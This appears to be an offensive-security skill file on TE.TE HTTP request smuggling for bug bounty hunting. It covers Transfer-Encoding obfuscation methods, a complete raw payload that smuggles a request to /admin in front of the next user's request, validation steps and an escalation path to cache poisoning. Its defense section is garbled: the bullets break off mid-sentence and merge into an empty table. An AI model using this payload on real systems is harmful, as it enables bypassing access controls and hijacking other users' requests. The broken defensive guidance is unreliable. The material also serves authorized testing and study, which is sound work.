---
name: http-request-smuggling-te-te
description: >
  Exploit advanced HTTP Request Smuggling combining Transfer-Encoding vulnerabilities (TE.TE). 
  By obscuring the Transfer-Encoding header, an attacker forces desynchronization between a 
  frontend proxy (which processes the request one way) and the backend server (which processes 
  it another way), allowing the smuggling of malicious requests to bypass security controls or 
  poison caches.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: expert
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0040]
  techniques: [T1190]
platforms: [web]
tags: [web-security, http-request-smuggling, te-te, burp-suite, bug-hunting, cache-poisoning]
tools: [burp-suite, curl]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# HTTP Request Smuggling (TE.TE)

## When to Use
- When auditing modern web architectures that utilize a reverse proxy, load balancer, or CDN (Frontend) sitting in front of the actual application server (Backend).
- When standard CL.TE or TE.CL request smuggling vectors fail because both servers support the `Transfer-Encoding: chunked` header.
- To achieve critical impact such as bypassing front-end IP restrictions, web application firewalls (WAF), or executing devastating web cache poisoning attacks.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding TE.TE Smuggling (The Concept)

```text
# Concept: Normally, HTTP requests are separated securely.
# In Request Smuggling, we send *one* mathematically ambiguous HTTP request that the Frontend 
# proxy interprets as a single request, but the Backend interprets as *two* requests.

# TE.TE (Transfer-Encoding / Transfer-Encoding) occurs when BOTH the Frontend and Backend 
# servers support the `Transfer-Encoding` header.

# The Attack: We send a request with TWO `Transfer-Encoding` headers, but we intentionally 
# obfuscate one of them. The goal is to make the Frontend process the request using `chunked` 
# encoding, but trick the Backend into ignoring it (falling back to `Content-Length`) or vice versa.
```

### Phase 2: Obfuscating the Transfer-Encoding Header

```http
# We must find an obfuscation technique that one server accepts but the other rejects.

# Method 1: Spacing
Transfer-Encoding: chunked
Transfer-Encoding : x

# Method 2: Invalid encoding name
Transfer-Encoding: xchunked

# Method 3: Line folding (historical, but sometimes effective)
Transfer-Encoding:
 chunked

# If the Frontend processes the first header (chunked) and the Backend processes the second (invalid/ignored),
# we effectively convert the attack into a standard TE.CL attack, achieving desynchronization.
```

### Phase 3: Crafting the TE.TE Payload

```http
# Objective: The Frontend sees 1 request. The Backend sees 2 requests.
# Below is the raw HTTP request. (Note: \r\n line endings are CRITICAL and must perfectly align).

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# The Breakdown:
# 1. Frontend: Processes `Transfer-Encoding: chunked`. Reads the chunk sizes (5c and 0) and forwards the entire block as one request.
# 2. Backend: Ignores `Transfer-encoding: cow` (or prioritizes `Content-Length: 4`). 
#    It reads only the first 4 bytes of the body ("5c\r\n"). 
# 3. The Smuggle: The backend leaves the remaining data (`GPOST /admin...`) sitting in its TCP buffer.
# 4. The Impact: The NEXT legitimate user who sends a request will inadvertently have their request appended to our smuggled `GPOST /admin` request!
```

### Phase 4: Validating and Exploiting

```bash
# 1. Use Burp Suite's "HTTP Request Smuggler" extension to accurately test permutations automatically.
# 2. To manually verify, send the payload repeatedly using Burp Repeater (updating Content-Length).
# 3. Watch for anomalous responses to normal requests (e.g., getting a 403 Forbidden for a normal request because it got appended to the smuggled `/admin` path).
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Frontend Proxy / Load Balancer] --> B[Send basic TE.TE obfuscated payloads via Burp Suite]
    B --> C{Does a timeout occur or do subsequent normal requests get anomalous responses?}
    C -->|Yes| D[TE.TE Desynchronization Confirmed! The backend is interpreting the smuggled prefix.]
    C -->|No| E[Try different obfuscation techniques (tabs, vertical tabs, capitalization, newlines)]
    D --> F[Escalate to Web Cache Poisoning by smuggling a request with a malicious Host header]
    E --> C
```


## 🔵 Blue Team Detection & Defense
- **HTTP/2**: Upgrade the frontend-to-backend infrastructure to securely utilize HTTP/2 end-to-end **Header Normalization**: Ensure your frontend Load Balancer (e.g., HAProxy, Nginx) is **Disable Backend Connection Persistence**: Configure Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Http Request Smuggling Te Te — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling/obfuscating-te-header)
- DEF CON 27 (Albinowax): [HTTP Desync Attacks: Request Smuggling Reborn](https://www.youtube.com/watch?v=wVzVNA230aM)
